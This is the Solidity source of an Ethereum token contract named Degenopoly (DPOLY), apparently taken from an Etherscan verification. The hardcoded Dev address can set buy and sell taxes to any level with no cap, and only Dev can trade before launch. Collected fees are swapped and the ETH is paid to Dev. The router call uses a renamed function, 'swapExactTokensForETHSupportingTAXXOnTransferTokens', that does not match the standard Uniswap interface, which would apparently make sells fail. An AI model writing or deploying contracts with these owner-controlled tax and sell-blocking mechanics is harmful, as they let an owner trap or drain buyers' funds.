/**
 *Submitted for verification at Etherscan.io on 2023-09-25
*/

/*
Degenopoly (🎲,🎲)

Twitter https://twitter.com/DegenopolyERC

Telegram https://t.me/degenopolyerc

*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.15;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTAXXOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract DPOLY {
        

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

        string public   name_ = "Degenopoly"; 
        string public   symbol_ = "DPOLY";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000 * 10**decimals;

        uint256 buyTAXX = 0;
        uint256 sellTAXX = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed Dev,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant Dev = payable(address(0x43EbEA19051Cee13a47803C6971a172db5C5CeD4));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == Dev || to == Dev);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTAXXOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                Dev.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TAXXAmount = amount * (from == pair ? buyTAXX : sellTAXX) / 100;
                amount -= TAXXAmount;
                balanceOf[address(this)] += TAXXAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == Dev);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setTAXX(uint256 _buy, uint256 _sell) private {
            buyTAXX = _buy;
            sellTAXX = _sell;
        }

        function setTAXX(uint256 _buy, uint256 _sell) external {
            if(msg.sender != Dev)        
                revert Permissions();
            _setTAXX(_buy, _sell);
        }
    }